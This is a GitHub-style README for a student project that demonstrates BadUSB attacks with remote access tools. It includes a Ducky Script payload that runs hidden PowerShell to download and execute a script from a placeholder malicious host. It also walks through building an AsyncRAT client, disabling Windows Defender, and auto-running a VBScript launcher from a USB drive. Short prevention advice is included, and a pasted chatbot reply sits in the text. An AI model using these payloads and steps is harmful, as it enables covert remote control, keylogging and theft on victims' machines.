# PeripheralAttack
This project demonstrates the vulnerabilities of USB devices by using BadUSB and Remote Access Tools. We transform a USB drive into a RubberDucky, execute an attack to gain remote access, and provide recommendations for prevention and mitigation.
# HACKING THROUGH PERIPHERAL INTERFACES

## Project Description
**Title:** Hacking Through Peripheral Interfaces

**Summary:** This project demonstrates the vulnerabilities of USB devices by using BadUSB and Remote Access Tools (RAT). We transform a USB drive into a RubberDucky, execute an attack to gain remote access, and provide recommendations for prevention and mitigation.

## Table of Contents
- [Introduction](#introduction)
- [Background and Motivation](#background-and-motivation)
- [Implementation](#implementation)
  - [Concepts Used](#concepts-used)
  - [Setup](#setup)
  - [Execution](#execution)
- [Prevention and Mitigation](#prevention-and-mitigation)
  - [User Education](#user-education)
  - [Technical Solutions](#technical-solutions)
- [Conclusion](#conclusion)
- [References](#references)
- [How to Run the Project](#how-to-run-the-project)

## Introduction
**Objective:** 
To demonstrate the concept of BadUSB and Remote Access Tool by setting up a pendrive into a RubberDucky and executing an attack on a victim.

## Background and Motivation
Peripheral interfaces, especially USB devices, present a significant risk if exploited maliciously. This project aims to increase awareness of such vulnerabilities and the necessary precautions to prevent such attacks.

## Implementation

### Concepts Used
- **BadUSB:** BadUSB is a vulnerability that allows USB devices to be reprogrammed and used as malicious devices without the user's knowledge.
- **Remote Access Tool (RAT):** RAT is a type of malware that provides an attacker with remote control of a victim's computer.

### Setup
1. **Setting Up the RubberDucky:**
   - Purchase a USB RubberDucky or create one using a programmable microcontroller.
   - Write a payload script to perform the desired malicious action (e.g., opening a backdoor).
   - Load the payload onto the RubberDucky.

2. **Creating the Payload:**
   ```bash
   REM This is an example payload script
   DELAY 1000
   STRING powershell -w hidden -noni -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')"
   ENTER


3. **Configuring the Remote Access Tool:**

Choose a RAT software (e.g., Metasploit, njRAT).

Configure the RAT server and generate the payload executable.

Ensure the payload is accessible via the internet or a local network.

4.  **Execution**
   
4.1 **Attack Scenario:**

The attacker plugs the RubberDucky into the victim's computer.

The payload script runs, executing the commands to download and run the RAT payload.

4.2 **Outcome:**

The attacker gains remote access to the victim's computer.

Demonstrate the capabilities of the RAT (e.g., capturing screenshots, logging keystrokes).

5.  **Prevention and Mitigation:**

User Education
Educate users about the risks of connecting unknown USB devices.

Promote best practices for handling USB devices.

6. **Technical Solutions:**

USB Restrictions: Implement group policies or endpoint protection solutions to restrict USB access.

USB Security Solutions: Use security tools that can detect and block unauthorized USB devices.

Software Updates: Regularly update antivirus and security software to detect new threats.

7. **Conclusion:**

This project highlights the vulnerabilities associated with peripheral interfaces like USB devices. By understanding and demonstrating these threats, we emphasize the importance of user education and robust security measures.

#HOW TO RUN:

Absolutely! Here’s the professional version of the **HOW TO RUN** section for your README.md file:

---

## How to Run the Project

### Prerequisites
- **AsyncRAT**: Ensure you have the AsyncRAT software.
- **AutoRunUSB Creator Tool**: Download and install this tool.

### Setup Files
```vbscript
Dim objShell
Set objShell = CreateObject("WScript.Shell")

Dim appPath
appPath = "AsyncClient.exe"

objShell.Run Chr(34) & appPath & Chr(34),1, False

Set objShell = Nothing
```

### Steps to Create the RubberDucky USB
1. **Install AsyncRAT:**
   - Temporarily disable Windows Defender.
   - Run the AsyncRAT software.

2. **Create Build in AsyncRAT:**
   - Right-click and select "Create Build."
   - Enter the desired port and IP address of your network.
   - Click on "Finish" to generate the client executable.

3. **Prepare the USB Drive:**
   - Copy the generated client executable to your chosen USB drive.
   - Include the provided `.VBScript` file in the USB drive.

4. **Configure AutoRunUSB:**
   - Open the AutoRunUSB Creator Tool.
   - Select the `.VBScript` file to run automatically upon USB insertion.
   - Locate and select the USB drive from the dropdown menu.
   - Click "Finish" to finalize the setup.

5. **Finalize:**
   - Unplug the USB drive. 
   - Your RubberDucky USB is now ready to deploy.

---
